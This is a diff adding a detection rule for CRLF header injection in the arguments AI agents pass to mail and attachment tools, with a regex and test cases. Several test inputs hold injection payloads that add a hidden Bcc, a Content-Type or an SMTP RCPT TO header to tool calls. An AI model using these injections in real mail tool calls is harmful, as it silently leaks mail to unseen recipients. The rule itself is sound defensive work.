@@ -1,0 +1,198 @@
+title: "Mail or Attachment Tool Argument Splits into a New Header via Embedded CRLF"
+id: ATR-2026-02707
+rule_version: 2
+status: experimental
+description: >
+  Detects a recipient, subject or filename argument of an agent mail/attachment
+  tool whose QUOTED value contains a line break followed by a fresh RFC 5322 /
+  MIME header name or an SMTP verb -- `to: "user@corp.example\r\nBcc:
+  watcher@collector.example"`, `filename: "report.pdf\r\nContent-Type:
+  text/html"`, `\r\nRCPT TO:`. Mined from CVE-2026-30227 (MimeKit CRLF
+  injection in a quoted local-part enabling SMTP command injection and sender
+  forgery); the same one-value-becomes-two-lines shape is what CVE-2026-43882
+  exploits in ICS and what header smuggling exploits in HTTP. Verified on the
+  shipped engine that `{"tool":"send_email","to":"user\r\nBcc: watcher@..."}`
+  matched only ATR-2026-00063/00099, and that a BENIGN control
+  (`to: alice@corp.example, subject: Q3`) matched the same rules -- i.e. those
+  hits are spray, not coverage of CRLF at all.
+  The opening quote is required deliberately: without it the condition fires on
+  every raw RFC822 header block (`From: alice@corp.example` newline `To: ...`),
+  which is ordinary mailbox content and was the first false positive this rule
+  produced during authoring.
+author: "ATR Community (CVE sweep)"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: test
+severity: high
+
+references:
+  cwe:
+    - "CWE-93"
+    - "CWE-77"
+  owasp_llm:
+    - "LLM05:2025"
+  owasp_agentic:
+    - "ASI04:2026"
+  mitre_attack:
+    - "T1114 - Email Collection"
+  mitre_atlas:
+    - "AML.T0053 - LLM Plugin Compromise"
+  cve:
+    - "CVE-2026-30227"
+  external:
+    - "https://nvd.nist.gov/vuln/detail/CVE-2026-30227"
+
+metadata_provenance:
+  cwe: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+  mitre_attack: human-reviewed
+  mitre_atlas: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 (accuracy, robustness and cybersecurity) requires resilience against inputs that alter system behaviour; this rule detects a mail-tool argument that splits into an additional header, silently adding a recipient or changing the MIME type."
+      strength: primary
+    - article: "9"
+      context: "Article 9 (risk management system) requires identified risks to be treated; this rule is the runtime treatment for CRLF header injection through agent mail tools."
+      strength: secondary
+  nist_ai_rmf:
+    - subcategory: "MG.2.3"
+      context: "Silent recipient injection through an agent mail tool is an identified AI risk requiring an active runtime countermeasure; this rule implements it."
+      strength: primary
+    - subcategory: "MP.5.1"
+      context: "Cataloguing CRLF-driven header splitting in tool arguments as an AI-specific risk in the organizational risk register."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "ISO/IEC 42001 Clause 8.1 (operational planning and control) is operationalised by rejecting line breaks in single-line tool arguments before the message is submitted."
+      strength: primary
+    - clause: "8.3"
+      context: "ISO/IEC 42001 Clause 8.3 (AI risk treatment) is implemented through runtime detection of the header split."
+      strength: secondary
+
+tags:
+  category: tool-poisoning
+  subcategory: crlf-header-injection-tool-argument
+  scan_target: runtime
+  confidence: high
+
+agent_source:
+  type: tool_call
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  conditions:
+    - field: tool_args
+      operator: regex
+      value: '["\x27](?:to|cc|bcc|from|reply[_-]?to|subject|filename|attachment)["\x27]\s{0,3}[:=]\s{0,3}["\x27][^"\x27\r\n]{0,40}(?:\\r)?(?:\\n|[\r\n])\s{0,4}(?:bcc|cc|reply-to|content-type|content-transfer-encoding|content-disposition|mime-version|rcpt\s{1,3}to|mail\s{1,3}from|x-[a-z][a-z0-9-]{1,20})\s{0,2}:'
+      description: "A recipient/subject/filename argument whose QUOTED KEY and QUOTED VALUE come from a serialized tool call, and whose value contains a line break followed by a new mail header name or SMTP verb. rule_version 2 made the KEY quote mandatory as well as the value quote. Version 1 required only the value quote, and that let every piece of writing ABOUT this attack through: an advisory saying to=\"user@corp.example\\r\\nBcc: ...\", a library changelog, a WAF signature note, an OWASP-style cheat sheet, a pentest finding and a non-English advisory all fired, because documentation writes the argument assignment exactly the way the attack does -- with an unquoted key. Every one of this rule's own true positives and its evasion test uses the quoted-key form, so recall is unchanged."
+  false_positives:
+    - "ADVERSARIAL, 2026-08-24 refutation pass: rule_version 1 fired on 6 of 14 benign probes, ALL of them security writing that quotes the payload with its argument assignment -- the CVE-2026-30227 advisory, a library changelog, a WAF signature note, an OWASP-style explanation, a pentest finding, and a Traditional Chinese advisory. Version 1's false-positive list claimed documentation normally quotes the payload WITHOUT an argument assignment; that claim was wrong. Fixed by requiring the argument key to be quote-delimited, which prose is not. All six are now true_negatives."
+    - "RESIDUAL, accepted: an article or eval dataset that reproduces the verbatim serialized call still matches -- same bytes as the attack."
+    - "RESIDUAL, ambiguous by design: a mail parser that joins repeated headers of the same name into one value ({\"cc\":\"a@corp.example\\r\\nCc: c@corp.example\"}) matches. This is NOT excluded on purpose: a value that adds a second Cc recipient is the attack whether a parser or an attacker produced it, and RE2 has no backreference with which to require that the injected header name differ from the argument name."
+    - "A raw RFC822 message or mailbox export, where From:/To:/Subject: lines follow one another unquoted. The condition requires an opening quote immediately before the value, which unquoted header blocks do not have -- this was the first measured false positive during authoring and the reason the quote is mandatory."
+    - "A parsed email object ({\"from\":\"alice@corp.example\",\"to\":\"bob@corp.example\"}), because each value is closed before the next field and no line break sits inside a value."
+    - "A multi-line message BODY, since body/text/html/content are not in the argument-name set."
+    - "Documentation describing CRLF injection, which normally quotes the payload without a preceding argument assignment inside quotes."
+
+response:
+  actions:
+    - alert
+  message_template: >
+    [ATR-2026-02707] A mail or attachment tool argument contains a line break
+    followed by a new header name -- one value is becoming two headers. Reject
+    CR and LF in single-line address, subject and filename parameters.
+
+confidence: 80
+
+test_cases:
+  true_positives:
+    - input: '{"tool":"send_email","arguments":{"to":"user@corp.example\r\nBcc: watcher@collector.example","subject":"Q3 numbers"}}'
+      expected: triggered
+      description: "CVE-2026-30227 shape -- a recipient value adding a hidden Bcc recipient"
+    - input: '{"tool":"send_email","arguments":{"subject":"Invoice 8812\nContent-Type: text/html","body":"see attached"}}'
+      expected: triggered
+      description: "Subject value re-declaring the MIME type so the body renders as HTML"
+    - input: '{"tool":"attach_file","arguments":{"filename":"report.pdf\r\nContent-Disposition: inline; filename=\"x.html\""}}'
+      expected: triggered
+      description: "Multipart filename splitting into a second Content-Disposition header"
+    - input: '{"tool":"smtp_send","arguments":{"from":"noreply@corp.example\r\nRCPT TO: <ops@collector.example>"}}'
+      expected: triggered
+      description: "Envelope sender carrying an injected SMTP RCPT TO verb"
+    - input: "{'to': 'user@corp.example\\r\\nBcc: watcher@collector.example'}"
+      expected: triggered
+      description: "ADDED rule_version 2: the same injection with a Python-dict repr rather than JSON, confirming the quoted-key requirement accepts single quotes."
+  true_negatives:
+    - input: 'From: alice@corp.example\r\nTo: bob@corp.example\r\nSubject: Q3 numbers\r\n\r\nAttached.'
+      expected: not_triggered
+      description: "A raw RFC822 header block -- ordinary mailbox content, no quoted argument value"
+    - input: '{"tool":"send_email","arguments":{"to":"alice@corp.example","cc":"bob@corp.example","subject":"Q3 numbers"}}'
+      expected: not_triggered
+      description: "A normal parsed mail tool call with one value per field"
+    - input: '{"tool":"send_email","arguments":{"to":"alice@corp.example","body":"Hi Alice,\r\n\r\nNumbers attached.\r\n\r\nRegards,\r\nOps"}}'
+      expected: not_triggered
+      description: "A multi-line body, which is not an argument this rule inspects"
+    - input: '{"tool":"write_file","path":"docs/crlf.md","content":"CRLF injection means a value containing \\r\\n splits into a second header such as Bcc: or Content-Type:."}'
+      expected: not_triggered
+      description: "Documentation describing the attack with no argument assignment carrying the payload"
+
+    - input: "CVE-2026-30227: MimeKit accepted to=\"user@corp.example\\r\\nBcc: watcher@collector.example\" and emitted two headers instead of one. Upgrade to 4.9.1."
+      expected: not_triggered
+      description: "ADVERSARIAL (2026-08-24 refutation pass): the CVE-2026-30227 advisory sentence. Fired rule_version 1 -- prose writes the argument assignment exactly the way the attack does, with an unquoted key."
+    - input: "## 4.9.1\\n\\n### Security\\n- Reject values such as subject=\"Invoice 8812\\r\\nContent-Type: text/html\" before serialisation (CWE-93)."
+      expected: not_triggered
+      description: "ADVERSARIAL: the library changelog announcing the fix. Fired v1."
+    - input: "signatures:\\n  - id: crlf-mail-01\\n    note: matches to=\"a@b.example\\r\\nBcc: c@d.example\"\\n    action: block"
+      expected: not_triggered
+      description: "ADVERSARIAL: a WAF signature file documenting what it blocks. Fired v1."
+    - input: "資安公告：舊版函式庫接受 to=\"user@corp.example\\r\\nBcc: watcher@collector.example\" 這種值，會多送一位隱藏收件人，請升級。"
+      expected: not_triggered
+      description: "ADVERSARIAL: a non-English (Traditional Chinese) advisory. Fired v1."
+    - input: "Header injection happens when a single-line value is not validated. A classic example is filename=\"report.pdf\\r\\nContent-Type: text/html\", which turns one MIME part into two."
+      expected: not_triggered
+      description: "ADVERSARIAL: cheat-sheet style writing explaining header injection with a filename example. Fired v1."
+    - input: "Finding 4 (High). The notification endpoint reflected the parameter unchanged: from=\"noreply@corp.example\\r\\nRCPT TO: <ops@collector.example>\". Remediation: strip CR and LF."
+      expected: not_triggered
+      description: "ADVERSARIAL: a penetration-test finding quoting the reflected parameter. Fired v1."
+    - input: "{\"tool\":\"send_email\",\"arguments\":{\"to\":\"alice@corp.example,\\r\\n bob@corp.example,\\r\\n carol@corp.example\"}}"
+      expected: not_triggered
+      description: "RFC 5322 header folding across several recipients -- a continuation line, not a new header."
+    - input: "{\"tool\":\"send_email\",\"arguments\":{\"subject\":\"Q3 numbers for the\\r\\n Americas region\"}}"
+      expected: not_triggered
+      description: "A folded Subject line continuing the same header."
+    - input: "{\"To\":\"bob@corp.example\",\"From\":\"alice@corp.example\",\"Subject\":\"Q3 numbers\",\"Date\":\"Tue, 12 Aug 2026 09:00:00 +0000\"}"
+      expected: not_triggered
+      description: "A JSON mailbox export with one value per header."
+    - input: "{\"templates\":{\"alert\":{\"subject\":\"[ALERT] {{service}} is down\",\"body\":\"{{detail}}\"}}}"
+      expected: not_triggered
+      description: "A notification template config with a subject containing a placeholder."
+    - input: "{\"tool\":\"send_email\",\"arguments\":{\"to\":\"ops@corp.example\",\"attachment\":\"report.pdf\",\"subject\":\"weekly\"}}"
+      expected: not_triggered
+      description: "An ordinary attachment argument with a plain filename."
+    - input: "S: 250 OK\nC: MAIL FROM:<alice@corp.example>\nC: RCPT TO:<bob@corp.example>\nC: DATA"
+      expected: not_triggered
+      description: "An SMTP session transcript: MAIL FROM / RCPT TO appear as protocol lines, not inside a quoted argument value."
+    - input: "mail:\n  \"from\": \"noreply@corp.example\"\n  \"reply-to\": \"support@corp.example\"\n  \"subject\": \"Weekly digest\""
+      expected: not_triggered
+      description: "A YAML mail configuration whose keys happen to be quoted -- one single-line value each."
+    - input: "{\"tool\":\"send_email\",\"arguments\":{\"to\":\"財務@corp.example\",\"subject\":\"第三季報表\",\"body\":\"附件如上\"}}"
+      expected: not_triggered
+      description: "A normal non-English mail tool call."
+    - input: "{\"tool\":\"build_mime\",\"arguments\":{\"filename\":\"report.pdf\",\"headers\":\"Content-Disposition: attachment\"}}"
+      expected: not_triggered
+      description: "A MIME builder call where the header name lives in its own argument rather than inside the filename value."
+    - input: "{\"id\":42,\"input\":\"{\\\"to\\\":\\\"user@corp.example\\\\r\\\\nBcc: watcher@collector.example\\\"}\",\"label\":\"crlf-injection\"}"
+      expected: not_triggered
+      description: "ADVERSARIAL against the FIX: an evaluation dataset row carrying the payload double-escaped. The inner key quotes are backslash-escaped, so the value quote the rule requires is not adjacent."
+evasion_tests:
+  - input: '{"tool":"send_email","arguments":{"to":"user@corp.example\r\n   bcc :watcher@collector.example"}}'
+    expected: triggered
+    bypass_technique: lowercase_header_and_whitespace_before_colon
+    notes: "Case is never distinguished by the engine and bounded \\s runs absorb the padding RFC 5322 tolerates. A bare LF folded with a leading tab (obs-fold) that continues the SAME header rather than starting a new one is out of scope by design: that is header folding, not injection."
